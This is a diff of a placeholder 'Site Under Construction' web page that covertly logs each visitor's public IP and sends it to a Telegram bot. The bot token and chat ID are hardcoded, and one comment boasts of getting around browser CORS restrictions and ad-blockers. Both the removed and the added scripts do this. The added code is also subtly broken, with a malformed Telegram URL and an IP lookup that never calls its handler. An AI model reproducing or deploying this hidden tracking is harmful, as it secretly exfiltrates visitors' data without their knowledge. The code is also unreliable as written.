@@ -5,41 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome</title>
     <script>
-        window.onload = function() {
-            // 1. Grab the user's public IP
-            fetch('https://ipify.org')
-                .then(response => response.json())
-                .then(data => {
-                    const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
-                    const chatId = '8714686528';
-                    const message = `📌 New Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
-                    
-                    // 2. Format request using modern fetch parameters
-                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                    
-                    fetch(telegramUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        }),
-                        keepalive: true // Keeps request alive even if visitor closes tab quickly
-                    })
-                    .then(res => {
-                        if (!res.ok) {
-                            console.error('Telegram rejected the request. Check if you started the bot.');
-                        }
-                    })
-                    .catch(err => console.error('Network Error:', err));
-                })
-                .catch(error => {
-                    console.error('Could not retrieve IP address:', error);
-                });
-        };
+        // This function triggers automatically as soon as the IP data is fetched
+        function sendToTelegram(json) {
+            const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
+            const chatId = '8714686528';
+            const textMessage = `📌 New Visitor Logged\n🌐 IP Address: ${json.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("text", textMessage);
+            
+            fetch(`https://telegram.org{botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData,
+                cache: 'no-cache'
+            })
+            .then(res => {
+                if (!res.ok) {
+                    console.error("Telegram rejected request. Did you click /start inside the bot?");
+                }
+            });
+        }
     </script>
+    <!-- We pull the IP directly via a script tag. This bypasses standard browser CORS restrictions and blocks -->
+    <script src="https://ipify.org" onerror="console.error('The IP lookup provider is blocked by an ad-blocker.')"></script>
 </head>
 <body>
     <h1>Site Under Construction</h1>
